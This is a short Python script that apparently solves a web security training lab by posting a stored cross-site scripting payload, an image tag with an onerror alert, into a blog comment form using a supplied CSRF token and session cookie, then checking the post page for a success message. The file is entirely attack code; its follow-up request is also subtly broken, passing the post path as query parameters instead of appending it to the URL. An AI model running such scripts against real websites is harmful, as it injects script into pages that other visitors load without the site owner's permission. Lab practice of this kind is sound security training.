import requests
import urllib3
from sys import argv

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def get_website_urls():
    if len(argv) != 4:
        print(f"[+] usage {argv[0]} <url> <csrf> <session>")
        print(f"[+] example {argv[0]} 'http://example.com' 'tyjmfvPKuTuDQKW88ajLNbN49J1Dvev8' '87djvTlilX3qXyWuHboUy4R22fFCENre'")
        exit(-1)

    if argv[1][-1] == '/':
        url = argv[1][:-1]
    else:
        url = argv[1]

    csrf = argv[2]
    session = argv[3]

    return url, csrf, session

def attack():
    url, csrf, session = get_website_urls() 
    print("[+] Starting attack")
    posts_path = "/post/comment"
    xss_payload = '<><img src=1 onerror="alert()">'

    print(f"[+] sending xss payload : {xss_payload}")
    params = {
        "csrf":csrf,
        "postId":"2",
        "comment":xss_payload,
        "name":"attacker",
        "email":"attacker@attack.com",
        "website":""
    }
    cookie = {"session":session}

    r = requests.post(url + posts_path, data=params, cookies=cookie)
    r = requests.get(url, "/post?postId=2")
    if 'Congratulations' in r.text:
        print("[+] attack successfully")
    else:
        print(f"[!] go to this link: {url}/post?postId=2")
attack()
